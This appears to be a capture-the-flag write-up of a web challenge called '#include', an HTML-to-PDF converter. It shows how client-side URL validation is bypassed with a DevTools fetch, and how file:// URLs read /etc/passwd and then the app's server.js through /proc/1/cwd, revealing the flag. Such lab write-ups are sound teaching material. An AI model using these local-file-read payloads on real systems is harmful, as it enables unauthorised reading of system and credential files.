# #include — Web CTF Writeup

**Category:** Web
**Target:** `http://txg.chal2.teagod.tech:8722/`
**Flag:** `NHNC{Well_done!_stay_tuned_for_the_next_challenge.}`

## Challenge Description

> Yet another PDF converter. easy enough, right?
> flag in source code.

The app is a simple "URL to PDF" converter: user submits a URL, the server renders it in a headless browser and returns a PDF.

## Recon

Fetched the page source and static assets:

```
curl http://txg.chal2.teagod.tech:8722/
curl http://txg.chal2.teagod.tech:8722/main.js
curl http://txg.chal2.teagod.tech:8722/style.css
```

`main.js` showed the client posts to `POST /convert` with fields `url` and `g-recaptcha-response`, and enforces `^https?://` client-side only. It also fetches `/captcha-config` to conditionally load reCAPTCHA.

Client-side validation is not a security boundary — the `url` field can be set to anything before submission.

## Vulnerability

The target accepts `file://` URLs. Server-side, the only defense is a directory check:

```js
async function points_to_local_directory(input) {
  let url;
  try { url = new URL(input); } catch { return false; }
  if (url.protocol !== 'file:') return false;
  try {
    return (await fs.stat(file_url_to_path(url))).isDirectory();
  } catch { return false; }
}
```

This blocks `file:///some/dir/` but does nothing to stop reading arbitrary **files**. Combined with `html-pdf-node` rendering the page in headless Chrome, any local file the process can read gets rendered as text/HTML inside the resulting PDF — classic local file read via SSRF in a URL-to-PDF service.

## Exploitation

Captcha was active, so requests had to originate from a real browser session (token is single-use, tied to origin).

1. Load the page in browser, solve the reCAPTCHA checkbox manually.
2. Bypass the client-side `http(s)://` regex check by calling `/convert` directly from DevTools console instead of submitting the form:

```js
let token = grecaptcha.getResponse();
let body = new URLSearchParams();
body.set('url', 'file:///etc/passwd');
body.set('g-recaptcha-response', token);
fetch('/convert', { method: 'POST', body })
  .then(r => r.blob())
  .then(b => {
    const a = document.createElement('a');
    a.href = URL.createObjectURL(b);
    a.download = 'passwd.pdf';
    a.click();
  });
```

3. Extract text from the returned PDF:

```bash
pdftotext passwd.pdf -
```

This confirmed `/etc/passwd` was readable, including a non-default user `ctf:x:1337:1337::/home/ctf:/bin/sh`, indicating a custom app setup.

4. Blind directory guessing (`/app/*`, `/home/ctf/*`, `/flag.txt`, etc.) all failed with HTTP 500 — either the path didn't exist or resolved to a directory (blocked by `points_to_local_directory`).

5. Pivoted to `/proc/1/cwd/`, which on Linux is a symlink to the working directory of PID 1 (the Node process) — resolved transparently by the OS/Chrome, sidestepping the need to know the real path:

```
file:///proc/1/cwd/package.json
```

Result:

```json
{
  "name": "include",
  "version": "1.0.0",
  "type": "module",
  "private": true,
  "scripts": { "start": "node server.js" },
  "dependencies": {
    "express": "^4.19.2",
    "html-pdf-node": "file:../lib/html-pdf-node"
  }
}
```

This confirmed the entry point (`server.js`) and the local dependency path.

6. Read the entry point directly:

```
file:///proc/1/cwd/server.js
```

The rendered PDF contained the full `server.js` source, including the `points_to_local_directory` check described above, the `/convert` route, and — appended after `app.listen(...)` — the flag.

## Flag

```
NHNC{Well_done!_stay_tuned_for_the_next_challenge.}
```
